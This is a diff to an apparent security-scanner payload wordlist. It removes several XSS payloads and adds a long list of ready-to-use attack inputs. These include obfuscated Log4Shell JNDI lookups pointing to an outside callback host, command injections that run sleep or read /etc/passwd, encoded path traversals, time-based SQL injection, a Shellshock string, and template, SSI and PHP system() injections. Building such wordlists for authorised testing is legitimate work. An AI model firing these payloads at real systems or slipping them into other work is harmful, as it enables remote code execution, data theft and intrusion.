@@ -1,9 +1,105 @@
-<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert`1`"></xss>
-<svg><animate onbegin=alert(1) attributeName=x dur=1s>
-<svg><animate onend=console.log(1) attributeName=x dur=1s>
-<details ontoggle=window.alert(1) open>test</details>
-<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onwebkitanimationiteration="alert(1)"></xss>
-<IMG SRC=x onerror="alert(String.fromCharCode(88,83,83))">
-<iframe  src="&Tab;javascript:prompt(1)&Tab;">
-<iframe  src="javascript:prompt(1)">
-<img src=`xx:xx`onerror=alert(1)>
+${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{l4jcheck.drstrange.org}}/314445},
+${${::-j}ndi:rmi://l4jcheck.drstrange.org/314445},
+${jndi:rmi://l4jcheck.drstrange.org/314445},
+${jndi:rmi://l4jcheck.drstrange.org}/,
+${${lower:jndi}:${lower:rmi}://l4jcheck.drstrange.org/314445},
+${${lower:${lower:jndi}}:${lower:rmi}://l4jcheck.drstrange.org/314445},
+${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://l4jcheck.drstrange.org/314445},
+${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://l4jcheck.drstrange.org/314445},
+${jndi:dns://l4jcheck.drstrange.org/314445},
+${jnd${123%25ff:-${123%25ff:-i:}}ldap://l4jcheck.drstrange.org/314445},
+${jndi:dns://l4jcheck.drstrange.org},
+${j${k8s:k5:-ND}i:ldap://l4jcheck.drstrange.org/314445},
+${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap://l4jcheck.drstrange.org/314445},
+${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://l4jcheck.drstrange.org/314445},
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//l4jcheck.drstrange.org/314445},
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//l4jcheck.drstrange.org/314445,
+${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//l4jcheck.drstrange.org/314445},
+${jndi:${lower:l}${lower:d}a${lower:p}://l4jcheck.drstrange.org},
+${jnd${upper:i}:ldap://l4jcheck.drstrange.org/314445},
+${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://l4jcheck.drstrange.org/314445}
+.^,/<>'"
+;'
+#
+\
+${
+*
+/*
+//
+?
+@
+toString
+__proto__
+length
+prototype
+--help
+--version
+$PATH
+'$PATH
+"$PATH
+|id #
+`id`
+../../../../../../../etc/passwd
+..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd%00
+;sleep 4;
+|sleep 4#
+|/usr/bin/sleep 4#
+|sleep 4;
+& sleep 4;
+;sleep 4|
+`sleep 4`
+`/usr/bin/sleep 4`
+`sleep 4`
+() { :;}; /bin/bash -c "sleep 4"
+|C:\Windows\System32\timeout.exe 4
+|timeout 4|
+|C:\Windows\System32\timeout.exe 4|
+|timeout 4;
+;system('timeout 4')
+;system('C:\Windows\System32\timeout.exe 4')
+&& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+;Start-Sleep -s 4;
+;Start-Sleep -s 4#
+|Start-Sleep -s 4|
+|Start-Sleep -s 4;
+;Start-Sleep -s 4|
+;system('Start-Sleep -s 4')
+%0AStart-Sleep -s 4%0A
+%0a Start-Sleep -s 4 %0a
+sleep(4)#
+1 or sleep(4)#
+" or sleep(4)#
+' or sleep(4)#
+" or sleep(4)="
+' or sleep(4)='
+1) or sleep(4)#
+") or sleep(4)="
+') or sleep(4)='
+1)) or sleep(4)#
+")) or sleep(4)="
+')) or sleep(4)='
+;waitfor delay '0:0:4'--
+);waitfor delay '0:0:4'--
+';waitfor delay '0:0:4'--
+";waitfor delay '0:0:4'--
+');waitfor delay '0:0:4'--
+");waitfor delay '0:0:4'--
+));waitfor delay '0:0:4'--
+'));waitfor delay '0:0:4'--
+"));waitfor delay '0:0:4'--
+$(`cat /etc/passwd`)
+|cat /etc/passwd
+;cat /etc/passwd#
+;cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+%0Acat%20/etc/passwd
+;system('cat%20/etc/passwd')
+&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;
